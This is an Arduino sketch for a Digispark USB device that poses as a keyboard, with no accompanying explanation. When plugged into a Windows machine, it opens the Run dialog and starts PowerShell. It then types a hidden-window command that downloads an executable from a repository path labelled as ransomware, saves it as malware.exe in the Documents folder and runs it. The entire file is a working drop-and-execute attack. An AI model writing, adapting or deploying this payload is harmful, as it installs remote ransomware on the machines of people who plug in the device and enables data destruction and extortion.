#include <DigiKeyboardFi.h>

void setup() {}

void loop() {
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(500);
DigiKeyboardFi.print("powershell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1500);
DigiKeyboardFi.print("powershell.exe -windowstyle hidden Invoke-WebRequest -OutFile $env:UserProfile/Documents/malware.exe -Uri \"https://github.com/therealhalonen/PhishSticks/raw/master/payloads/ransomware/ransom_app/encrypt.exe\";Start-Process $env:UserProfile/Documents/malware.exe -WorkingDir $env:UserProfile/Documents");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
exit(0);
}
